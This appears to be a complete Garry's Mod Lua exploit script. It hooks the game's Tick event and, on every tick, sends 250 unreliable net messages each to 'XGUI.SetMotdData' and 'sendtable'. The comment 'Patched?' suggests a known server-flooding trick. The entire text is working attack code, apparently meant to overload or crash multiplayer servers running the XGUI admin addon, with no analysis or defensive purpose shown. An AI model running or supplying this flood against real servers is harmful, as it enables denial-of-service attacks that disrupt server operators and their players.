hook.Add( 'Tick', 'Test', function( )
    for i = 1, 250 do
        // Patched? 
        net.Start( 'XGUI.SetMotdData', true )
		net.SendToServer( )

        net.Start( 'sendtable', true )
        net.SendToServer( )
    end
end )